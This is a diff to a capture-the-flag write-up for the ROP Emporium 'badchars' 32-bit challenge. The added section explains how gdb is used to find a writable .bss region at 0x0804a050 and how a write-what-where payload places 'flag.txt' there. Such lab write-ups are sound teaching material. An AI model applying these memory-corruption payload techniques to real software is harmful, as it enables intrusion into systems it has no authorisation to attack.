@@ -69,12 +69,42 @@ def write_what_where(data, addr):
 
 The function would then be called like this:
 ```python
-# Choosing 0x0804a050 as my address; more on that later
+# Choosing 0x0804a050 as my address; more on that in a moment
 payload += write_what_where(b'flag', b'\x50\xa0\x04\x08')
 
 ```
 
 To write `flag.txt` into memory, we will need to leverage this primitive at least two times. Once to write the first four bytes (`b'flag'`) and once for the second four (`b'.txt'`). I am in the habit of also calling it a third time, to make sure my string is null-terminated (`b'\x00'`) and then I usually write another 3 bytes just for fun, making my third call something like `b'\x00lol'`. Of note, the third call is probably not necessary in my case, as I chose to write data to the `.bss` segment, where almost the whole region of memory is full of null bytes anyways, but I have the third one in there just to be safe.
 
+## Where to write the payload?
+Fundamentally, we need a region of memory which is mapped `rw`, which will not break other parts of the code if we overwrite it. A popular place that meets these requirements is the .bss section. In gdb, we can find and confirm this is a valid place to write our data. I use a gdb script to kick off the process, and then look at the mappings after the program is running.
+```
+#### script.gdb ####
+
+# Breakpoint on shared library load
+catch load
+
+# Run until the .so is loaded
+# Set a breakpoint on the ret instruction from the pwnme function
+run < <(python challenge.py)
+break *pwnme+273
+####################
+
+gdb ./badchars32 -x script.gdb
+
+(gdb) info proc mappings
+...
+0x0804a000 0x0804b000 0x1000     0x1000     rw-p  /root/rop-emporium/badchars/badchars32
+
+# Confirming that the .bss section lives in here:
+(gdb) maintenance info sections
+[22]     0x804a000->0x804a018 at 0x00001000: .got.plt ALLOC LOAD DATA HAS_CONTENTS
+[23]     0x804a018->0x804a020 at 0x00001018: .data ALLOC LOAD DATA HAS_CONTENTS
+[24]     0x804a020->0x804a024 at 0x00001020: .bss ALLOC
+```
+It's important to note that although the `.bss` section only shows a range of 4 bytes here, the kernel maps the entire 4096-byte memory page (from `0x0804a000` to `0x0804b000`). This means we have plenty of space to write our `b'flag.txt'` string here. Also, we definitely don't want to overwrite stuff in the .got.plt section to avoid breaking things. I chose the address `0x0804a050` which is just a short way into the unused space in the `.bss` section.
+
 ## Running into the badchars filtering
+So far, everything we have done is basically the same as the write4 challenge. Here is where it gets interesting.
+
 
